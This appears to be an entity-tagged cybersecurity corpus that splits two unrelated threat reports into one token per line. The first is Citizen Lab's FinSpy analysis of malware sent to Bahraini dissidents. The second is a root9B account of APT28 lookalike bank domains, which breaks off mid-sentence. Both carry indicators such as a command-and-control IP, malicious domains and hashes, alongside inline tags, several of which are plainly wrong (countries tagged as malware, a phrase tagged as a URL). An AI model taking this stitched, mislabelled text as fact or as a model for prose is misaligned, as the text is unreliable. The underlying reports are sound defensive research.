C:/WINDOWS/Installer/{49FD463C18F1-63C4-8F12-49F518F127}/09e493e2-05f9-4899-b661-c52f3554c644

Thu
Jun
14
2012
12:32:18
285691
...b
r/rrwxrwxrwx
0
0
26397-128-4
C:/WINDOWS/Installer/{49FD463C18F1-63C4-8F12-49F518F127}/t111o00000000.dat

Thu
Jun
14
2012
12:55:12
285691
mac
.
r/rrwxrwxrwx
0
0
26397-128-4

C:/WINDOWS/Installer/{49FD463C-18F1-63C4-8F12-49F518F127}/t111o00000000.dat
4096
..c.
-/rr-xr-xr-x
0
0
26447-128-4

The
infected
process
'
winlogon.exe
'
was
observed
writing
this
file
via
Process
:

Examination
of
this
file
reveals
that
it
is
a
screenshot
of
the
desktop
:

July
2012

Many
other
modules
providing
specific
exfiltration
capabilities
were
observed
.

Generally
,
the
exfiltration
modules
write
files
to
disk
using
the
following
naming
convention
:
XXY1TTTTTTTT.dat
.

XX
is
a
two-digit
hexadecimal
module
number
,
Y
is
a
single-digit
hexadecimal
submodule
number
,
and
TTTTTTTT
is
a
hexadecimal
representation
of
a
unix
timestamp
(
less
1.3
billion
)
associated
with
the
file
creation
time
.

ENCRYPTION

The
malware
uses
encryption
in
an
attempt
to
disguise
harvested
data
in
the
.dat
files
intended
for
exfiltration
.

Data
written
to
the
files
is
encrypted
using
AES-256-CBC
(
with
no
padding
)
.

The
32-byte
key
consists
of
8
readings
from
memory
address
0x7ffe0014
:
a
special
address
in
Windows
that
contains
the
low-order-4-bytes
of
the
number
of
hundred-nanoseconds
since
1
January
1601
.

The
IV
consists
of
4
additional
readings
.

The
AES
key
structure
is
highly
predictable
,
as
the
quantum
for
updating
the
system
clock
(
HKLM\SYSTEM\CurrentControlSet\Services\W32Time\Config\LastClockRate
)
is
set
to
0x2625A
hundred-nanoseconds
by
default
,
and
the
clock
readings
that
comprise
the
key
and
IV
are
taken
in
a
tight
loop
:

July
2012

0x406EA4
:
8D45C0
LEA
EAX,[EBP-0x40]

0x406EA7
:
50
PUSH
EAX

0x406EA8
:
FF150C10AF01
CALL
DWORD
PTR
[0x1AF100C]

0x406EAE
:
8B4DE8
MOV
ECX,DWORD
PTR
[EBP-0x18]

0x406EB1
:
8B45C0
MOV
EAX,DWORD
PTR
[EBP-0x40]

0x406EB4
:
8345E804
ADD
DWORD
PTR
[EBP-0x18],0x4

0x406EB8
:
6A01
PUSH
0x1

0x406EBA
:
89040F
MOV
DWORD
PTR
[EDI+ECX],EAX

0x406EBD
:
FF152810AF01
CALL
DWORD
PTR
[0x1AF1028]

0x406EC3
:
817DE800010000
CMP
DWORD
PTR
[EBP-0x18],0x100

0x406ECA
:
72D8
JB
0x406EA4

0x406ECC
:
80277F
AND
BYTE
PTR
[EDI],0x7F

The
following
AES
keys
were
among
those
found
to
be
used
to
encrypt
records
in
.dat
files
.

The
first
contains
the
same
4
bytes
repeated
,
whereas
in
the
second
key
,
the
difference
between
all
consecutive
4-byte
blocks
(
with
byte
order
swapped
)
is
0x2625A
.

70
31
bd
cc
70
31
bd
cc
70
31
bd
cc
70
31
bd
cc
70
31
bd
cc
70
31
bd
cc
70
31
bd
cc
70
31
bd
cc

26
e9
23
60
80
4b
26
60
da
ad
28
60
34
10
2b
60
8e
72
2d
60
e8
d4
2f
60
42
37
32
60
9c
99
34
60

In
all
,
64
clock
readings
are
taken
.

The
readings
are
encrypted
using
an
RSA
public
key
found
in
memory
(
whose
modulus
begins
with
A25A944E
)
and
written
to
the
.dat
file
before
any
other
encrypted
data
.

No
padding
is
used
in
the
encryption
,
yielding
exactly
256
encrypted
bytes
.

After
the
encrypted
timestamp
values
,
the
file
contains
a
number
of
records
encrypted
with
AES
,
delimited
by
EAE9E8FF
.

In
reality
,
these
records
are
only
partially
encrypted
:
if
the
record's
length
is
not
a
multiple
of
16
bytes
(
the
AES
block
size
)
,
then
the
remainder
of
the
bytes
are
written
to
the
file
unencrypted
.

For
example
,
after
typing
'
FinSpy B_malware.infosteal
'
on
the
keyboard
,
the
keylogger
module
produced
the
following
(
trailing
plaintext
highlighted
)
:

July
2012

The
predictability
of
the
AES
encryption
keys
allowed
us
to
decrypt
and
view
these
partially-encrypted
records
in
full
plaintext
.

The
nature
of
the
records
depends
on
the
particular
module
and
submodule
.

For
example
,
submodule
Y
==
5
of
the
Skype
exfiltration
module
(
XX
==
14
)
,
contains
a
csv
representation
of
the
user's
contact
list
:

Record
#
0
Length
:
243
bytes
:
@þÿÌ3Ð
¤b
̄Opþ192.168.131.67JRecordingEcsv
0þ-0800UTC
DST.1þ2012-07-18
18:00:21.:þ1970-01-01
00:16:00Abhwatch1

Record
#
1
Length
:
96
bytes
:
'
USERNAME,FULLNAME,COUNTRY,AUTHORIZED,BLOCKED

Record
#
2
Length
:
90
bytes
:

Zecho123,Echo
/
Sound
Test
Service,,YES,NO

Record
#
3
Length
:
95
bytes
:
^bhwatch2,Bahrain
Watch,United
States,YES,NO

Submodule
Y
==
3
records
file
transfers
.
After
a
Skype
file
transfer
concludes
,
the
following
file
is
created
:
%USERPROFILE%\Local
Settings\Temp\smtXX.tmp
.

This
file
appears
to
contain
the
sent
/
received
file
.

As
soon
as
smtXX.tmp
is
finished
being
written
to
disk
,
a
file
(
1431XXXXXXXX.dat
)
is
written
,
roughly
the
same
size
as
smtXX.tmp
.

After
sending
a
picture
(
of
birdshot
shotgun
shell
casings
used
by
Bahrain's
police
)
to
an
infected
Skype
client
,
the
file
1431028D41FD.dat
was
observed
being
written
to
disk
.

July
2012

Decrypting
it
revealed
the
following
:

Record
#
0
Length
:
441
bytes
:
@þÿÌ3Ð
¤b
̄Opþ192.168.131.67Abhwatch1Bbhwatch2'CBahrain
WatchIreceivedr
C:\DocumentsandSettings\XPMUser\MyDocuments\gameborev3.jpgJRecording
0þ-0800UTC
DST.1þ2012-07-20
12:18:21.:þ2012-07-20
12:18:21

Record
#
1
Length
:
78247
bytes
:
[Note
:
Record
#1
contained
the
contents
of
the
.jpg
file
,
preceded
by
hex
A731010090051400
,
and
followed
by
hex
0A0A0A0A.]

Additionally
,
submodule
Y
==
1
records
Skype
chat
messages
,
and
submodule
Y
==
2
records
audio
from
all
participants
in
a
Skype
call
.

The
call
recording
functionality
appears
to
be
provided
by
hooking

DirectSoundCaptureCreate
:

July
2012

COMMAND
AND
CONTROL

This
section
describes
the
communications
behavior
of
the
malware
.

When
we
examined
the
malware
samples
we
found
that
they
connect
to
a
server
at
IP
address
77.69.140.194 B_ip.distribute

July
2012

WHOIS
data7
reveals
that
this
address
is
owned
by
Batelco
,
the
principal
telecommunications
company
of
Bahrain
:

inetnum
:
77.69.128.0
-
77.69.159.255

netname
:
ADSL

descr
:
Batelco
ADSL
service

country
:
bh

For
a
period
of
close
to
10
minutes
,
traffic
was
observed
between
the
infected
victim
and
the
command
and
control
host
in
Bahrain
.

A
summary
of
the
traffic
by
port
and
conversation
size
(
click
image
to
enlarge
)
:

The
infected
VM
talks
to
the
remote
host
on
the
following
five
TCP
ports
:
22
53
80
443
4111

Based
on
observation
of
an
infected
machine
we
were
able
to
determine
that
the
majority
of
data
is
exfiltrated
to
the
remote
host
via
ports
443
and
4111
.

July
2012

192.168.131.65:1213
->
77.69.140.194:443
1270075
bytes

192.168.131.65:4111
->
77.69.149.194:4111
4766223
bytes

CONCLUSIONS
ABOUT
MALWARE
IDENTIFICATION

Our
analysis
yields
indicators
about
the
identity
of
the
malware
we
have
analyzed
:
(
1
)
debug
strings
found
the
in
memory
of
infected
processes
appear
to
identify
the
product
and
(
2
)
the
samples
have
similarities
with
malware
that
communicates
with
domains
belonging
to
Gamma
International
.

Debug
Strings
found
in
memory

As
we
previously
noted
,
infected
processes
were
found
containing
strings
that
include
'
finspyv4.01 B_malware.infosteal
'
and
'
finspyv2 B_malware.infosteal
'
:

y:\lsvn_branches\finspyv4.01\finspyv2\src\libs\libgmp\mpn-tdiv_qr.c
y:\lsvn_branches\finspyv4.01\finspyv2\src\libs\libgmp\mpn-mul_fft.c
y:\lsvn_branches\finspyv4.01\finspyv2\src\target\bootkit_x32driver\objfre_w2k_x86\i386\bootkit_x32driver.pdb

Publicly
available
descriptions
of
the
FinSpy B_malware.infosteal
tool I
collected
by
Privacy
International
among
others
and
posted
on
Wikileaks
8
make
the
a
series
of
claims
about
functionality
:


Bypassing
of
40
regularly
tested
Antivirus
Systems


Covert
Communication
with
Headquarters


Full
Skype
Monitoring
(
Calls
,
Chats
,
File
Transfers
,
Video
,
Contact
List
)


Recording
of
common
communication
like
Email
,
Chats
and
Voice-over-IP


Live
Surveillance
through
Webcam
and
Microphone


Country
Tracing
of
Target


Silent
Extracting
of
Files
from
Hard-Disk


Process-based
Key-logger
for
faster
analysis


Live
Remote
Forensics
on
Target
System


Advanced
Filters
to
record
only
important
information


Supports
most
common
Operating
Systems
(
Windows
,
Mac
OSX
and
Linux
)

Shared
behavior
with
a
sample
that
communicates
with
Gamma

The
virtual
machine
used
by
the
packer
has
very
special
sequences
in
order
to
execute
the
virtualised
code
,
for
example
:

July
2012

66
C7
07
9D
61
mov
word
ptr
[
edi
]
,
619Dh

C6
47
02
68
mov
byte
ptr
[
edi
+
2
]
,
68h

89
57
03
mov
[
edi
+
3
]
,
edx

C7
47
07
68
00
00
00
mov
dword
ptr
[
edi
+
7
]
,
68h

89
47
08
mov
[edi+8]
,
eax

C6
47
0C
C3
mov
byte
ptr
[
edi
+
0Ch
]
,
0C3h

Based
on
this
we
created
a
signature
from
the
Bahrani
malware
,
which
we
shared
with
another
security
researcher
who
identified
a
sample
that
shared
similar
virtualised
obfuscation
.

That
sample
is
:
md5
:
c488a8aaef0df577efdf1b501611ec20 B_hash

sha1
:
5ea6ae50063da8354e8500d02d0621f643827346 B_hash
sha256
:
81531ce5a248aead7cda76dd300f303dafe6f1b7a4c953ca4d7a9a27b5cd6cdf B_hash

The
sample
connects
to
the
following
domains
:
tiger.gamma-international.de B_url.cncsvr
ff-demo.blogdns.org B_url.cncsvr

The
domain
tiger.gamma-international.de B_url.cncsvr
has
the
following
Whois
information
9
:

Domain
:
gamma-international.de B_url.cncsvr

Name
:
Martin
Muench

Organisation
:
Gamma
International
GmbH

Address
:
Baierbrunner
Str
.
15

PostalCode
:
81379

City
:
Munich

CountryCode
:
DE

Phone
:
+49-89-2420918-0

Fax
:
+49-89-2420918-1

Email
:
info@gamma-international.de

Changed
:
2011-04-04T11:24:20+02:00

July
2012

Martin
Muench
is
a
representative
of
Gamma
International
,
a
company
that
sells
'
advanced
technical
surveillance
and
monitoring
solutions
'
.
One
of
the
services
they
provide
is
FinFisher B_malware.infosteal
:
IT
Intrusion
,
including
the
FinSpy B_malware.infosteal
tool I
.

This
labelling
indicates
that
the
matching
sample
we
were
provided
may
be
a
demo
copy
a
FinFisher B_malware.infosteal
product
per
the
domain
ff-demo.blogdns.org B_url.cncsvr
.

We
have
linked
a
set
of
novel
virtualised
code
obfuscation
techniques
in
our
Bahraini
samples
to
another
binary
that
communicates
with
Gamma
International
IP
addresses
.

Taken
alongside
the
explicit
use
of
the
name
'
FinSpy B_malware.infosteal
'
in
debug
strings
found
in
infected
processes
,
we
suspect
that
the
malware
is
the
FinSpy B_malware.infosteal
remote I
intrusion I
tool I
.

This
evidence
appears
to
be
consistent
with
the
theory
that
the
dissidents
in
Bahrain
who
received
these
e-mails
were
targeted
with
the
FinSpy B_malware.infosteal
tool I
,
configured
to
exfiltrate
their
harvested
information
to
servers
in
Bahraini
IP
space
.

If
this
is
not
the
case
,
we
invite
Gamma
International
to
explain
.

RECOMMENDATIONS

The
samples
from
email
attachments
have
been
shared
with
selected
individuals
within
the
security
community
,
and
we
strongly
urge
antivirus
companies
and
security
researchers
to
continue
where
we
have
left
off
.

Be
wary
of
opening
unsolicited
attachments
received
via
email
,
skype
or
any
other
communications
mechanism
.

If
you
believe
that
you
are
being
targeted
it
pays
to
be
especially
cautious
when
downloading
files
over
the
Internet
,
even
from
links
that
are
purportedly
sent
by
friends
.

ACKNOWLEDGEMENTS

Malware
analysis
by
Morgan
Marquis-Boire
and
Bill
Marczak
.
Assistance
from
Seth
Hardy
and
Harry
Tuttle
gratefully
received
.

Special
thanks
to
John
Scott-Railton
.

Thanks
to
Marcia
Hofmann
and
the
Electronic
Frontier
Foundation
(
EFF
)
.

We
would
also
like
to
acknowledge
Privacy
International
for
their
continued
work
and
graciously
provided
background
information
on
Gamma
International
.

July
2012

FOOTNOTES
1
http://www.finfisher.com/ B_url.cncsvr

2
http://owni.eu/2011/12/15/finfisher-for-all-your-intrusive-surveillance-needs/#SpyFiles B_url.cncsvr

3
http://blogs.aljazeera.com/profile/melissa-chan B_url.cncsvr

4
This
technique
was
used
in
the
recent
Madi
malware
attacks
.

5
http://www.finfisher.com/ B_url.cncsvr

6
Unpacking
Virtualised
Obfuscators
by
Rolf
Rolles
http://static.usenix.org/event/woot09/tech/full_papers/rolles.pdf B_url.cncsvr

7
http://whois.domaintools.com/77.69.140.194 B_url.cncsvr

8
E.g.
http://wikileaks.org/spyfiles/files/0/289_GAMMA-201110-FinSpy.pdf B_url.cncsvr

9
http://whois.domaintools.com/gamma-international.de B_url.cncsvr

Back
to
top

MEDIA
COVERAGE

The
Wall
Street
Journal

Slate

Tech
Week
Europe

Bloomberg

Electronic
Frontier
Foundation

Privacy
International

Spiegel
Online

PC
Mag

The
New
York
Times

About
the
Author

Morgan
Marquis-Boire
is
a
Technical
Advisor
at
the
Citizen
Lab
,
Munk
School
of
Global
Affairs
,
University
of
Toronto
.

He
works
as
a
Security
Engineer
at
Google
specializing
in
Incident
Response
,
Forensics
and
Malware
Analysis
.
APT28
Targets

Financial
markets
:
zero B_malware.backdoor
day I
hashes
released

APT-28

'
In
the
last
year
alone
Russian
hackers
have
reportedly
stolen
up
to
900
million
dollars
from
banks
around
the
world
.
'

targets
Financial
Markets

ROOT9B
RELEASES
ZERO B_malware.backdoor
DAY I
HASHES

APT
28

Cybersecurity
experts
are
increasingly
concerned
about
the
threat
posed
by
Russian
hacking
groups
.

Besides
well-known
events
such
as
the
attacks
against
Estonia B_malware.unknown
,
Georgia B_malware.unknown
,
and
Ukraine B_malware.drop
;

recent
headlines
have
seen
Russian
hacking
syndicates
credited
with
targeting
NATO
officials
at
conferences
,
stealing
hundreds
of
millions
from
banks
,
and
successfully
penetrating
the
White
House
unclassified
computer
network
.

The
increase
in
cyber-exploits
is
also
accompanied
by
a
much
more
aggressive
Russian
foreign
policy
,
which
has
seen
them
invade
Ukraine
and
literally
seize
control
of
sovereign
territory
in
Crimea
.

So
it
should
not
surprise
anyone
that
just
as
nuclear
capable
Russian
bombers
are
increasingly
penetrating
foreign
airspace
,
their
cyber-warriors
appear
to
be
ramping
up
their
intrusions
as
well
.

But
this
time
,
perhaps
for
the
first
time
,
root9B
has
managed
to
find
where
they
were
hiding
and
identified
effective
defenses
against
their
intended
attacks
.

This
is
what
happened
in
late
April
and
early
May
of
this
year
.

Our
firm
of
cybersecurity
experts
,
staffed
by
veterans
from
the
United
States
Department
of
Defense
,
identified
suspicious
activity
within
one
of
our
client's
networks
;

a
threat
which
on
closer
inspection
bore
the
unique
signature
of
a
group
of
Russian
hackers
well-known
in
the
cyber-security
industry
.

As
Cyber
Threat
analysts
continued
to
follow
the
indicators
,
they
uncovered
a
global
attack
in
the
making
,
and
took
steps
to
protect
not
only
our
clients
,
but
other
identified
victims
as
well
.

Sofacy
,
Sednit
,
Sourface
,
APT-28
,
and
a
host
of
other
names
are
all
used
to
describe
this
particularly
prolific
and
superbly
talented
group
of
Russian
hackers
,
which
has
strongly
suspected
ties
to
Russian
intelligence
services
.

In
the
last
year
alone
Russian
hackers
have
reportedly
stolen
up
to
900
million
dollars
from
banks
around
the
world
.

Over
the
past
three
to
five
years
they
have
built
the
largest
botnets
ever
discovered
,
and
stolen
the
log-in
and
password
credentials
to
literally

tens
of
millions
of
online
accounts
.

Well
known
for
their
ability
to
infiltrate
and
remain
undiscovered
in
networks
for
long
periods
of
time
,
they
may
be
the
most
successful
group
of
hackers
in
the
world
.

Whereas
previous
attacks
have
been
attributed
and
analyzed
only
after
they
have
run
their
course
,
this
was
the
first
and
only
known
Sofacy B_malware.backdoor
attack I
to
be
discovered
,
identified
,
and
reported
–
all
before
it
could
even
begin
!

The
analysts
and
tools
that
enabled
this
to
happen
are
unique
and
proprietary
.

This
report
documents
the
first
ever
operation
to
use
threat
intelligence
and
adversary
tactics
to
discover
and
reveal
the
prepositioning
of
Sofacy B_malware.backdoor
zero-day I
malware I
.

This
document
also
includes
the
reporting
of
previously
unknown
malware
indicators
and
hashes
.

The
Threat

Russian
President
Vladimir
Putin
recently
described
the
Internet
as
'
an
invention
of
the
CIA
.
'

But
the
group
most
widely
associated
with
his
government
dominates
the
world
of
industrial
scale
hacking
.

First
discovered
circa
2007
using
security
vulnerabilities
in
Microsoft
Windows
,
Sofacy
has
gone
on
to
develop
and
launch
truly
enormous
attacks
exploiting
numerous
applications
including
Adobe's
Acrobat
,
Microsoft
Excel
,
and
others
.

Some
attacks
have
focused
on
the
sorts
of
targets
that
seem
likely
to
be
of
interest
to
Russian
intelligence
services
.

NATO
,
defense
industry
corporations
,
and
government
domains
of
states
opposed
to
Russia
on
various
issues
have
all
been
,
at
times
,
victims
of
Sofacy
.

At
other
times
large
banks
and
private
corporations
have
been
hit
hard
by
Sofacy
exploits
,
at
a
cost
of
hundreds
of
millions
to
the
victims
.

Sofacy's
choice
of
targets
has
historically
been
an
interesting
mixture
that
has
fueled
an
ongoing
debate
over
whether
the
group
is
criminal
in
nature
,
or
actually
an
agent
of
a
nation-state
.

Most
cybersecurity
analysts
have
concluded
that
the
group's
affiliation
with
the
Russian
government
is
undeniable
.

But
there
are
detractors
.

Those
who
argue
loudest
against
such
assertions
cite
Sofacy's
prolific
criminal
profit
as
evidence
that
they
are
most
likely
not
agents
of
the
Federal
Security
Service
(
FSB
)
;

while
others
suppose
that
the
crimes
committed
bearing
Sofacy's
unique
signatures
is
a
perfect
cover
behind
which
the
Russian
Government
prefers
to
remain
.

The
Defenders

Started
in
2012
and
staffed
almost
entirely
by
former
United
States
Department
of
Defense
civilians
and
military
cyber-warriors
,
root9B
brings
a
unique
base
of
knowledge
and
experience
to
the
task
of
securing
corporate
networks
.

This
comes
at
a
time
when
the
demand
for
services
is
stronger
than
ever
and
increasing
daily
.

Calling
on
years
of
collective
experience
in
positions
that
placed
their
analysts
at
the
tip
of
the
cyber-spear
,
root9B
has
developed
a
unique
approach
to
the
problem
of
cyber-defense
.

Understanding
that
the
present
tools
are
failing
at
an
alarming
rate
,
they
have
developed
methods
and
software
applications
which
seek
to
augment
,
rather
than
replace
,
existing
cyber-security
defenses
.

The
problem
is
not
that
traditional
methods
do
not
work
.

It
is
that
hackers
are
becoming
increasingly
sophisticated
and
able
to
generate
new
threats
faster
than
ever
before
.

Standard
network
security
systems
typically
fail
against
what
are
known
as
'
zero-day B_malware.backdoor
threats I
.
'

Zero-day B_malware.backdoor
is
a
term
that
refers
to
a
new
kind
of
hacking
exploit
that
has
never
been
seen
before
,
and
is
therefore
not
detected
by
standard
virus
and
intrusion
detection
software
.

Typically
,
such
threats
take
an
alarmingly
long
time
to
detect
and
eliminate
,
often
more
than
a
year
.

They
were
once
relatively
rare
,
because
it
takes
a
high
degree
of
skill
to
develop
and
exploit
them
.

The
production
and
sale
on
the
black
market
has
increased
exponentially
in
recent
years
,
developing
into
a
criminal
industry
that
is
placing
online
commerce
,
as
well
as
national
security
,
at
growing
risk
.

In
the
time
between
deployment
of
a
zero-day B_malware.backdoor
and
its
eventual
discovery
and
eradication
,
corporations
can
suffer
enormous
losses
without
even
realizing
that
the
threat
was
ever
there
.

To
combat
threats
,
root9B
realized
that
technology
is
not
the
problem
.

'
Computers
don't
attack
networks
.
People
do
,
'
said
root9B
.

You
cannot
build
a
better
system
to
stop
a
determined
human
,
you
must
think
like
the
attacker
and
provide
manned
cyber
defense
operations
as
the
new
adaptive
security
posture
.

root9B
operators
and
software
developers
designed

and
constructed
proprietary
methods
of
discovering
and
dealing
with
adversaries
.

With
a
network
defense
strategy
of
pursuit
and
deterrence
in
mind
,
root9B
operators
conduct
Active
Adversary
Pursuit
(
HUNT
)
operations
as
a
tailored
solution
for
cyber
security
teams
.

Working
in
concert
with
traditional
network
defense
appliances
that
currently
reside
in
our
client's
proprietary
network
,
root9B's
HUNT
platform
delivers
a
pro-active
defense
protection
capability
to
identify
,
pursue
,
and
mitigate
cyber
threats
.

This
approach
was
developed
by
root9B
in
order
to
leverage
previously
existing
security
products
with
client-specific
threat
intelligence
and
proprietary
capabilities
that
can
identify
sophisticated
vulnerabilities
,
generate
actionable
intelligence
,
and
install
solutions
with
much
greater
speed
and
efficiency
.



Winning
In
Advance

During
the
end
of
April
2015
,
root9B
analysts
were
conducting
routine
security
analysis
to
explore
and
discover
new
and
emerging
cyber
threats
.

Threat
Analysts
discovered
what
appeared
to
be
a
targeted
spearfishing B_url.cncsvr
domain I
aimed
at
a
financial
institution
.

The
server
it
was
found
on
raised
even
more
questions
,
because
although
security
experts
knew
the
server
as
a
bad
actor
,
it
was
generally
associated
with
malware
used
in
nation B_malware.drop
state I
attacks I
.

As
analysts
continued
their
work
they
discovered
several
more
pieces
of
new
malware
.

The
malicious
code
bore
specific
signatures
that
have
historically
been
unique
to
only
one
organization
,
Sofacy
.

This
malware
was
pointing
at
a
spearfishing B_url.cncsvr
domain I
registered
to
impersonate
a
Middle
Eastern
financial
institution
and
the
domain
registration
details
did
not
match
normal
Sofacy
operational
signatures
.

That
said
,
the
malicious
software
certainly
did
.

Members
of
root9B's
operations
team
conducted
HUNT
operations
,
remotely
deploying
their
live
memory
capability
across
the
clients
proprietary
networks
to
analyze
known
techniques
that
can
evade
the
most
efficient
security
products
on
the
market
.

root9B's
capability
parses
live
memory
while
the
system
is
running
and
looks
for
indicators
of
advanced
tactics
such
as
code
injection
or
security
product
bypassing
.

Using
a
combination
of
standard
industry
tools
and
proprietary
techniques
our
analysts
began
to
develop
a
larger
picture
of
what
was
taking
place
.

Immediately
,
root9B
identified
that
preparations
were
being
made
for
a
larger
scale
attack
similar
to
previous
Sofacy B_malware.backdoor
attributed
exploits
,
and
the
attack
was
still
in
the
preparatory
stages
.

To
our
analysts
,
this
was
a
rare
opportunity
.

'
It
is
rare
enough
to
learn
of
an
attack
of
this
potential
magnitude
in
advance
,
but
to
have
all
of
the
information
necessary
to
stop
it
before
it
begins
is
unprecedented
,
'
said
an
unnamed
root9B
analyst
.

Evidence
of
intrusion
within
client
networks
pointed
to
a
specific
server
,
CARBON2U.COM B_url.cncsvr
,
that
had
been
previously
linked
to
malicious
activity
and
identified
by
other
security
firms
as
part
of
the
infrastructure
utilized
by
the
Sofacy
group
.

Analysts
studied
the
remaining
domains
registered
on
that
server
,
and
initially
noted
that
one
in
particular
,
CBIUAEBANK B_url.cncsvr
.

COM B_url.cncsvr
,
appeared
to
be
a
fake
version
of
CBIUAE.COM B_url.normal
,
the
actual
domain
of
the
website
of
Commercial
Bank
International
of
the
United
Arab
Emirates
.

Further
analysis
lead
to
even
more
suspicion
,
and
those
suspicions
grew
even
stronger
as
they
watched
another
comparable
domain
created
,
CBIUAEBN
.

COM. B_url.cncsvr
As
analysts
passively
monitored
CARBON2U.COM B_url.cncsvr
,
they
observed
as
the
apparent
fake
domains
they
were
monitoring
migrated
to
other
servers
;

first
to
SITE4NOW.NET B_url.distribute
and
later
to
OK2HOST.COM B_url.distribute
.

This
gave
analysts
two
more
suspicious
servers
to
study
,
and
added
considerable
data
analysis
.

root9B
analysts
began
to
dissect
the
data
at
hand
to
identify
common
tactics
,
techniques
,
and
procedures
used
by
the
adversaries
which
could
provide
further
information
about
the
planned
hack
,
including
information
about
potential
attack
vectors
.

As
root9B
analyzed
increasing
amounts
of
metadata
and
associated
indicators
,
they
were
able
to
identify
a
very
unique
signature
consistently
used
by
someone
involved
in
setting
up
the
hack
.

Investigating
the
apparently
fictitious
list
of
personas
used
to
create
and
register
domains
,
a
pattern
emerged
.

Due
to
the
nature
of
this
unique
signature
,
root9B
is
in
the
process
of
further
documenting
and
reporting
to
the
proper
authorities
.

The
discovery
of
the
hacker's
single
mistake
in
tradecraft
was
indeed
a
powerful
catalyst
,
and
lead
to
the
discovery
of
a
treasure
trove
of
new
indicators
.

The
new
discoveries
included
evidence
related
to
past
attempts
to
launch
attacks
against
many
of
the
same
targets
,
including
the
aforementioned
Commercial B_malware.infosteal
Bank I
International I
.

What
the
analysts
eventually
had
was
a
very
detailed
view
of
the
specific
tactics
employed
by
this
adversary
;

and
a
window
into
a
plan
for
a
hack
that
was
even
larger
than
originally
believed
,
much
larger
.

Where
initially
they
had
only
a
single
fake
domain
pointed
at
CBI
,
now
there
were
six
additional
domains
,
all
used
to
target
this
single
victim
.

Many
of
the
fake
domains
appeared
to
have
been
created
by
several
of
the
same
accounts
,
and
open
source
analysis
indicated
that
the
names
listed
for
the

person
registering
the
addresses
was
clearly
fictitious
;

probably
chosen
at
random
from
the
Internet
.

The
analysts
at
root9B
understand
better
than
anyone
the
significance
of
this
analysis
.

As
far
as
any
of
them
know
,
and
it
stands
to
reason
that
they
would
,
there
has
never
been
a
case
of
a
large-scale
attack
utilizing
numerous
zero-day B_malware.backdoor
exploits
that
were
so
thoroughly
mapped
in
advance
before
.

The
analysts
who
worked
this
case
now
understand
that
the
attackers
began
preparations
for
this
campaign
in
June
2014
,
a
full
eleven
months
ago
.

The
design
of
the
hack
bears
striking
similarity
to
the
very
exploits
that
have
made
Sofacy B_malware.backdoor
so
feared
and
respected
.

At
least
nine
months
of
meticulous
preparation
coupled
with
one
slip
of
tradecraft
has
enabled
root9B
to
inform
potential
targets
prior
to
the
execution
of
the
strategy
.

With
the
exception
of
CBIUAEONLINE.COM B_url.cncsvr
,
there
are
numerous
consistencies
amongst
the
tactics
employed
by
the
hackers
.

The
group
generates
what
are
likely
fictitious
personalities
as
the
'
owners
'
of
each
of
the
fake
domains
.

All
of
the
fictitious
personalities
list
the
same
street
address
.

While
they
change
names
and
house
numbers
for
them
,
they
all
reside
on
Cloverdale
Lane
in
DeSoto
,
Texas
.

Analysts
noting
the
similarity
did
not
have
to
visit
the
street
to
determine
that
it
was
unlikely
that
they
each
resided
in
different
homes
on
the
same
street
.

In
fact
,
even
the
house
numbers
changed
only
slightly
from
one
domain
to
the
other
.

In
addition
to
the
links
between
the
addresses
,
streets
,
and
names
,
they
found
that
the
registrant
phone
numbers
were
also
very
closely
related
.

The
only
differences
in
registrant
data
from
one
domain
to
the
next
involved
very
slight
modifications
to
the
country
codes
or
by
changing
the
third
digit
.

This
kind
of
flaw
in
tradecraft
allowed
for
further
detailed
network
analysis
.

Further
analysis
of
the
street
addresses
enabled
root9B
to
correlate
the
address
and
personas
listed
as
registrants
via
public
records
,
doing
so
showed
that
most
of
these
addresses
did
not
even
exist
,
and
the
few
addresses
confirmed
to
physically
exist
did
not
have
residents
with
the
names
listed
.

This
became
a
key
signature
of
the
hackers
;

a
common
thread
which
unraveled
all
of
Sofacy's B_malware.backdoor
careful
preparation
.

Often
those
wanting
to
generate
a
free
and
anonymous
email
address
will
use
a
false
name
and
address
in
order
to
conceal
and
preserve
their
true
identity
.

The
information
below
dictates
open
source
research
on
the
adversary's
creation
of
domains
.

As
previously
noted
,
root9B
is
in
the
process
of
further
documenting
and
reporting
probable
fictitious
personas
to
the
authorities
.

DOMAIN
:
CBIBUAE.COM B_url.cncsvr
•
Created
:
2014-06-14
•
Nameserver
:
nvhserver.com B_url.cncsvr

DOMAIN
:
CBIUAEONLINE.COM B_url.cncsvr
•
Created
:
2014-06-24
•
Updated
:
2014-07-03
•Nameserver
:
aspnix.com B_url.cncsvr
(
suspended-domain
)

DOMAIN
:
ROYALBSUK.COM B_url.cncsvr
•
Created
:
2014-07-02
•
Updated
:
2014-07-06
•
Nameserver
:
(
suspended-domain
)

DOMAIN
:
CIBUAEONLINE.COM B_url.cncsvr
•
Created
:
2014-11-27
•
Updated
:
2014-01-27
•
Nameserver
:
hostzeal.com B_url.cncsvr

DOMAIN
:
CIBUAEONLINEBN.COM B_url.cncsvr
•
Created
:
2014-11-28
•
Updated
:
2014-01-27
•
Nameserver
:
site4now.net B_url.cncsvr

DOMAIN
:
CBIUAEONLINE.COM B_url.cncsvr
•
Created
:
2014-12-10
•
Updated
:
2014-02-08
•
Nameserver
:
ok2host.com B_url.cncsvr

DOMAIN
:
CBIUAEBANK.COM B_url.cncsvr
•
Created
:
2015-04-29
•
Updated
:
2015-05-02
•
Nameserver
:
site4now.net B_url.cncsvr

DOMAIN
:
CBIUAEBN.COM B_url.cncsvr
•
Created
:
2015-04-29
•
Updated
:
2015-05-03
•Nameserver
:
ok2host.com B_url.cncsvr

Correlating
the
increasing
amounts
of
information
,
root9B
analysts
have
determined
that
the
adversary
responsible
for
the
initial
attack
in
June
2014
was
almost
certainly
the
same
,
or
very
closely-related
to
the
entity
responsible
for
creating
at
least
two
of
the
domains
in
April
2015
.

The
same
person
was
ostensibly
responsible
for
registering
the
two
most
recent
domains
(
CBIUAEBN.COM B_url.cncsvr
and
CBIUAEBANK.COM B_url.cncsvr
)
.

Analysts
from
root9B
now
believe
that
the
adversary
most
likely
selected
this
name
through
an
internet
search
,
and
that
these
personas
,
while
possibly
real
names
,
are
not
the
true
names
of
those
individuals
associated
with
the
preparations
for
this
attack
.

root9B
analysts
have
also
identified
an
additional
persona
;

one
that
did
not
appear
to
directly
relate
to
this
attack
against
CBI
UAE
Bank
,
but
that
carried
similar
operational
tactics
to
include
comparable
street
address
schemes
and
the
registration
of
domains
closely
resembling
financial
institutions
.

By
studying
the
new
persona
,
root9B
discovered
they
had
previously
created
several
domains
and
websites
,
all
of
which
have
been
flagged
as
